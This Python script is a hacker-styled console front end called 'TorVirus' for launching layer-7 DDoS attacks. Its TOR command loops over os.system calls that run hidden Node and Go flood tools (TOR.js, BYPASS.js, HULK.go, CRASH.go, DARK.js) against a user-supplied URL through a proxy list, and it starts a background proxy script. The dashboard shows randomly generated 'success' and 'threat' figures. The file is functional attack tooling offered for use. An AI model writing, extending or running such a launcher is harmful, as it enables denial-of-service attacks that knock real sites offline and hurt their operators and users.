import os, time, sys, random
def progress(curr, total, bl=30):
    filled = int(bl * curr // total)
    bar = '█' * filled + '-' * (bl - filled)
    return f"[{bar}] {curr}/{total}"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_proxies(fp='proxy.txt'):
    try:
        with open(fp, 'r') as f:
            for line in f:
                p = line.strip()
                if p:
                    yield p
    except FileNotFoundError:
        print(f"⚠️  Error: {fp} not found. Proxy connection aborted.")
        sys.exit(1)

def display_stats():
    uptime = int(time.time() - session_start)
    mins, secs = divmod(uptime, 60)
    print(f'''
    🖥️ TorVirus DASHBOARD 🖥️
    | 🛰️ Bots Online: {bc}
    | ⏳ Uptime: {mins}m {secs}s
    | 📈 Success Rate: {random.randint(85, 99)}%
    | 🔗 Network Strength: {random.choice(["Strong", "Moderate", "Weak"])}
    | ⚠️ Threat Level: {random.choice(["🟢 Low", "🟡 Medium", "🔴 High"])}
    ''')

def matrix_fall(d=3):
    start = time.time()
    while time.time() - start < d:
        print(''.join(random.choice('01 ') for _ in range(80)))
        time.sleep(0.1)

def welcome_msg(bc, st):
    top_msg = "🚨 WELCOME TO TORVIRUS 🚨"
    proxy_info = f"| 🔐 Zombies: {bc} | Session: {st:.2f}s | 🌐 Tor✅"
    clear()
    matrix_fall(2)
    clear()

def display_menu():
    clear()
    welcome_msg(bc, session_time())
    print('''  
  _____      __   ___
 |_   _|__ _ \ \ / (_)_ _ _  _ ___
   | |/ _ \ '_\ V /| | '_| || (_-<
   |_|\___/_|  \_/ |_|_|  \_,_/__/ 
   
    🚨  LAYER7 ATTACK METHODS MENU  🚨
         (Top-secret Protocols)

    !TOR     - Launch TOR-based DDoS
      TOR https://example.com 120
''')

def load_anim(text, dur=1.5):
    frames = ['◐', '◓', '◑', '◒']
    start = time.time()
    i = 0
    while time.time() - start < dur:
        print(f'\r{text} {frames[i % len(frames)]}', end='', flush=True)
        time.sleep(0.15)
        i += 1
    print('\r', end='')

def anim_text(txt, delay=0.05, end_line=True):
    for char in txt:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    if end_line:
        print()

def rand_cool_text():
    texts = [
        "🌐 Establishing Encrypted TOR Network Tunnels...",
        "🌀 Tuning Low-Latency High-Speed Proxies...",
    ]
    r_txt = random.choice(texts)
    load_anim("Processing", 1.5)
    anim_text(r_txt)

def session_time():
    return time.time() - session_start

def main_loop():
    display_menu()
    while True:
        user_input = input("root@torvirus#~ ").strip()
        if not user_input:
            continue
        cmd_parts = user_input.split()
        cmd = cmd_parts[0].upper()
        if cmd == "STATS":
            clear()
            display_stats()
            continue
        elif cmd in ["CLEAR", "CLS"]:
            load_anim("Purging Console", 1.5)
            display_menu()
        elif cmd == "TOR":
            try:
                host = cmd_parts[1]
                total_time = int(cmd_parts[2])
                attack_time = 120
                start_time = time.time()

                anim_text(f"Engaging Attack on {host} for {total_time} seconds... 💥", 0.05)

                while time.time() - start_time < total_time:
                    os.system(f'node .TorCache/.TorOdd/TOR.js GET "{host}" {attack_time} 50 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
                    os.system(f'node .TorCache/.TorOdd/TOR.js POST "{host}" {attack_time} 50 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
                    os.system(f'node .TorCache/.TorOdd/BYPASS.js {host} {attack_time} 32 50 proxy.txt')
                    os.system(f'go run .TorCache/.TorOdd/HULK.go --site {host} --data GET')
                    os.system(f'go run .TorCache/.TorOdd/CRASH.go {host} 9999 get {attack_time} nil')
                    os.system(f'node .TorCache/.TorOdd/DARK.js GET {host} {attack_time} 32 50 proxy.txt')

                    time.sleep(1)

            except IndexError:
                print('❌ Invalid Command. Usage: METHOD URL TIME')
                print('Example: TOR https://example.com 120')

        elif cmd == "HELP":
            load_anim("Loading Help Interface", 1.5)
            print('''
HELP - For Assistance
CLEAR - Clear Terminal
''')
        else:
            print(f"❌ Command [ {cmd} ] not recognized. Please try again! 🚨")

def connect():
    anim_text("🔌 Connecting to the TorVirus Network...", 0.02)
    os.system('python3 .TorCache/.TorOdd/proxy.py &')
    rand_cool_text()

session_start = time.time()
proxies = list(load_proxies())
bc = len(proxies)
clear()
connect()
try:
    main_loop()
finally:
    pass